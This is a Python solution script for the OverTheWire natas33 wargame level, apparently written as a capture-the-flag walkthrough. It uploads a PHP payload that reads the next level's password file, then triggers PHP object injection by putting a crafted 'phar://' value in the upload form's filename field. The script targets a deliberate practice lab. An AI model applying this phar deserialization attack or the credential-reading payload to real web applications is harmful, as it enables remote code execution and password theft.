import requests
import json
import hashlib
import subprocess

auth = ("natas33", "[PW_HERE]")
url = "http://natas33.natas.labs.overthewire.org"


content = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
content_hash = hashlib.md5(content).hexdigest()
filename = 'shell.php'


# Nothing does object injection in PHP better than PHP.
# The templating is to avoid fiddling with the private attributes.
with open('natas33.php.template', 'r') as template:
    with open('natas33.php', 'w') as o:
        o.write(template.read().format(filename, content_hash))

# phar.readonly attribute is usually activated, to avoid exactly what we are trying to do ;)
output = subprocess.check_output(['php', '-d', 'phar.readonly=false', 'natas33.php'])

# Upload your rce script and overwrite the filename field to have the file accesible for the next step.
requests.post(url + '/index.php', auth=auth, data={'filename': filename, 'submit': 'Upload File'}, files={'uploadedfile': content})

# Now the tricky part: upload the generated phar file but instead of giving a file name, use the protocol handler.
r = requests.post(url + '/index.php', auth=auth, data={'filename': 'phar://test.phar/test.txt', 'submit': 'Upload File'}, files={'uploadedfile': open('test.phar', 'rb')})
print(r.text)
